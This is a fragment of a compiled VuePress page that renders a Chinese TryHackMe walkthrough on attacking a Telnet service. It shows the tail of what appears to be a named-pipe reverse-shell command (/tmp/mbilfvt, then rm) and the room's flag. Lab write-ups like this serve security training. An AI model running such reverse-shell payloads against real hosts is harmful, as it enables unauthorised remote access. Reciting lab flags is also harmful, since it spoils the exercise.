>"),s("span",{style:{"--shiki-light":"#B56959","--shiki-dark":"#C98A7D"}},"/tmp/mbilfvt"),s("span",{style:{"--shiki-light":"#AB5959","--shiki-dark":"#CB7676"}}," 2>&1"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}},";"),s("span",{style:{"--shiki-light":"#59873A","--shiki-dark":"#80A665"}}," rm"),s("span",{style:{"--shiki-light":"#B56959","--shiki-dark":"#C98A7D"}}," /tmp/mbilfvt")])])]),s("div",{class:"line-numbers","aria-hidden":"true",style:{"counter-reset":"line-number 0"}},[s("div",{class:"line-number"})])],-1)])),tab2:e(({value:n,isActive:l})=>i[12]||(i[12]=[s("div",{class:"language-bash line-numbers-mode","data-highlighter":"shiki","data-ext":"bash",style:{"--shiki-light":"#393a34","--shiki-dark":"#dbd7caee","--shiki-light-bg":"#ffffff","--shiki-dark-bg":"#121212"}},[s("pre",{class:"shiki shiki-themes vitesse-light vitesse-dark vp-code"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#59873A","--shiki-dark":"#80A665"}},"THM"),s("span",{style:{"--shiki-light":"#B56959","--shiki-dark":"#C98A7D"}},"{y0u_g0t_th3_t3ln3t_fl4g}")])])]),s("div",{class:"line-numbers","aria-hidden":"true",style:{"counter-reset":"line-number 0"}},[s("div",{class:"line-number"})])],-1)])),_:1})])}const v=r(A,[["render",y]]),C=JSON.parse('{"path":"/penetration/pjibfh9x/","title":"常见的网络服务-Telnet","lang":"zh-CN","frontmatter":{"title":"常见的网络服务-Telnet","createTime":"2024/11/16 19:34:46","permalink":"/penetration/pjibfh9x/"},"headers":[],"readingTime":{"minutes":5.61,"words":1683},"git":{"updatedTime":1732288003000,"contributors":[{"name":"suxiufeng","username":"suxiufeng","email":"suxiufengcool@163.com","commits":2,"avatar":"https://avatars.githubusercontent.com/suxiufeng?v=4","url":"https://github.com/suxiufeng"},{"name":"kali","username":"kali","email":"kali@kali","commits":1,"avatar":"https://avatars.githubusercontent.com/kali?v=4","url":"https://github.com/kali"}]},"filePathRelative":"notes/penetration/1.tryhackme/8.Network_Telnet.md"}');export{v as comp,C as data};
